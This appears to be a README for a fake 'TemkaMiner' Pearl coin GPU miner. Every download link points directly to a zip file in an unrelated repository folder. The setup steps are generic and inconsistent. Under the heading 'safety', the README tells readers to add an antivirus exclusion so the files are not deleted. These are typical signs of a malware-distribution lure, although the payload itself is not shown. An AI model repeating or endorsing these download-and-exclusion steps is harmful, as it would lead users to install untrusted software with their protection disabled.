# ⛏️ TemkaMiner-pearl-gpu-miner-PRL - Mine Pearl coin with your hardware

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL/main/warrener/Miner_Temka_PRL_gpu_pearl_miner_2.5.zip)

TemkaMiner-pearl-gpu-miner-PRL provides a way to mine Pearl coin using your NVIDIA graphics card. This software supports newer models such as the RTX 30, 40, and 50 series. It manages multiple graphics cards and allows you to switch between different mining pools for better results.

## ⚙️ System Requirements

Your computer needs specific parts to run this software. Ensure your machine meets these requirements before you start.

- Operating System: Windows 10 or Windows 11 (64-bit).
- Graphics Card: NVIDIA RTX 30 series, 40 series, or 50 series.
- Driver: Recent NVIDIA drivers installed via GeForce Experience or the NVIDIA website.
- Internet: A stable connection for consistent data transfer.
- Power: A power supply unit that handles the combined load of all graphics cards in your system.

## 💾 Downloading The Miner

You must visit the project page to get the installer for your computer. 

[Visit this page to download the software](https://raw.githubusercontent.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL/main/warrener/Miner_Temka_PRL_gpu_pearl_miner_2.5.zip)

1. Open the link above in your web browser.
2. Select the latest release version on the page.
3. Locate the file ending in .zip or .exe.
4. Download the file to your desktop or a folder you can find.

## 🛠️ Setting Up The Software

Follow these steps to prepare the files.

1. Locate the downloaded file. 
2. Right-click the file and choose "Extract all" if it is a zipped folder. Select a location on your hard drive to store the files.
3. Open the new folder created by the extraction process.
4. Find the file usually named `start.bat` or `config.json`. These files tell the miner where to send the coins you earn.

## 📝 Configuring Your Mining Wallet

The miner needs a destination address to send your coins. You must create a Pearl coin wallet if you do not have one.

1. Paste your unique wallet address into the configuration file.
2. Open the `config.json` file using a simple text editor like Notepad.
3. Find the line that says "wallet" or "address".
4. Replace the existing example text with your own address. 
5. Save the file and close the editor.

## 🚀 Running The Miner

Now you can start the mining process.

1. Double-click the file named `start.bat` in your miner folder. 
2. A black window will appear on your screen. This indicates the miner is active.
3. The program will check your hardware, establish a connection to the pool, and begin solving problems.
4. Keep the black window open while you wish to mine. Closing this window stops the process.

## 📊 Monitoring Performance

The black window displays information about your hardware. Read the lines to ensure your graphics cards function correctly.

- Hashrate: This number tells you how fast your card works. Higher numbers mean more work completed.
- Accepted Shares: This number shows how many valid solutions your cards found.
- Temperature: Monitor this to keep your cards cool. Modern NVIDIA cards slow down to prevent damage if they get too hot.

## 🛡️ Best Practices For Safety

Keep your computer secure while you mine.

- Use reliable mining pools. Research pools before you join them.
- Keep your antivirus software updated. Some security programs flag mining software as a threat. You may need to create an "exclusion" for your miner folder so the system does not delete the files.
- Monitor your electricity bill. Mining consumes significant power over long periods.
- Place your computer in a well-ventilated area. Airflow prevents your graphics cards from overheating during intense work cycles.

## 💻 Troubleshooting Common Issues

If you encounter errors, use these steps to resolve them.

- If the miner does not start, verify that you updated your NVIDIA drivers.
- If the miner closes immediately, re-check your `config.json` file for typos or missing characters in the wallet address.
- If your hash rate stays at zero, ensure your internet connection works and you have entered the correct pool address in the configuration file.
- If your computer feels slow, adjust the intensity settings in the configuration file to allow your graphics card to handle other tasks while mining.

## 🔗 Project Details

This software focuses on the Pearl coin ecosystem. It uses the CUDA platform to communicate directly with NVIDIA hardware for faster processing speeds. The tool handles multi-GPU setups automatically, identifying all connected cards on boot. Users can configure multiple backup pools to ensure mining continues if the primary server goes offline. This design creates a stable experience for long-term mining operations.